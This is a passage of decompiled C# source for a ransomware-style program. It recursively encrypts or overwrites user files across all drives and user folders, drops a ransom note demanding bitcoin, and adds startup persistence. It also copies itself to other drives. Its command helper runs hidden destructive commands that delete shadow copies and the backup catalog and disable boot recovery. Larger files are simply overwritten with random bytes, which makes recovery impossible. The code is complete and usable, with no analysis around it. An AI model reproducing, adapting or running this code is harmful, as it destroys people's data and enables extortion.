	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[7] { "Hi all you files are encrypted!", "", " You should be more careful about what you install on the internet! ", "", "It was a joke... You can recover your files by sending 100 $ to this btc adress : 1FW1HQp9H5Vm2hw3wDjR7h95CU8mcRh8k1", "", "Or add me on discord : KyC_KosMos#8139" };

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
